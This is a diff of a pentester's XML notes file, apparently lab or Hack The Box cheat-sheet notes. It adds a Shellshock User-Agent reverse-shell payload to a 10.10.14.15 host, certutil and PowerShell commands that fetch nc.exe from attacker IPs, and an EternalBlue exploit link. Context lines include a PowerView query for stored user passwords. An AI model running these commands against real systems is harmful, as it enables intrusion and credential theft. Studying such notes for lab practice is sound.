@@ -318,7 +318,7 @@ Attacker:
       <rich_text family="monospace">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</rich_text>
     </node>
   </node>
-  <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1663517460">
+  <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1663605128">
     <node name="cmd" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394591" ts_lastsave="1663521397">
       <rich_text>get hostname / pc name
 hostname
@@ -641,7 +641,16 @@ Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
 </rich_text>
     </node>
-    <node name="metasploit" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655727658" ts_lastsave="1655727658"/>
+    <node name="download_file" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663605128" ts_lastsave="1663605130">
+      <rich_text>certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe</rich_text>
+    </node>
+    <node name="windows_hacks" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663435801" ts_lastsave="1663605117">
+      <rich_text link="webs https://github.com/helviojunior/MS17-010">https://github.com/helviojunior/MS17-010</rich_text>
+      <rich_text> eternal_blue</rich_text>
+    </node>
+  </node>
+  <node name="shell" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663587498" ts_lastsave="1663587499">
+    <rich_text family="monospace">User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1</rich_text>
   </node>
   <node name="smb_enum" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663517460" ts_lastsave="1663517460">
     <rich_text link="webs https://steflan-security.com/hack-the-box-blue-walkthrough/">https://steflan-security.com/hack-the-box-blue-walkthrough/</rich_text>
@@ -752,7 +761,7 @@ locate &lt;filename&gt;
 finding file other
 find -name &lt;filename_can_wildcard&gt;</rich_text>
     </node>
-    <node name="finding_files" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656667532" ts_lastsave="1656668429">
+    <node name="finding_files" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656667532" ts_lastsave="1663571102">
       <rich_text>using find
 
 sudo find / -name sbd
@@ -762,7 +771,9 @@ finding binary in PATH
 which
 
 finding files by database
-locate</rich_text>
+locate
+
+grep -r "string" "path"</rich_text>
     </node>
     <node name="apt" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656668183" ts_lastsave="1656668381">
       <rich_text>update database
@@ -799,10 +810,6 @@ dpkg -i &lt;package_file&gt;.deb</rich_text>
       <rich_text>python -m SimpleHTTPServer &lt;port&gt;
 python3 -m http.server &lt;port&gt;</rich_text>
     </node>
-  </node>
-  <node name="windows_hacks" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663435801" ts_lastsave="1663435815">
-    <rich_text link="webs https://github.com/helviojunior/MS17-010">https://github.com/helviojunior/MS17-010</rich_text>
-    <rich_text> eternal_blue</rich_text>
   </node>
   <node name="NodeJS" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1658117659" ts_lastsave="1658117662">
     <rich_text>Node Install Package : 
@@ -1850,8 +1857,18 @@ exit</rich_text>
     <node name="pivoting" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656313484" ts_lastsave="1656313486">
       <rich_text>sudo ssh -N -L 0.0.0.0:80:192.168.1.105:80 wtf@10.1.2.114 </rich_text>
     </node>
-    <node name="windows_ps_via_cmd" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663520409" ts_lastsave="1663521697">
-      <rich_text>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2/nc.exe', 'c:\Users\Public\Downloads\nc.exe')"</rich_text>
+    <node name="windows_ps_via_cmd" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663520409" ts_lastsave="1663605176">
+      <rich_text>powershell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2/nc.exe', 'c:\Users\Public\Downloads\nc.exe')"
+
+download
+certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
+
+tasklist
+enum all tasks
+
+netstat -ano
+check all open network interface</rich_text>
     </node>
   </node>
   <node name="obfuscate_deobfuscate" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656818398" ts_lastsave="1656836768">
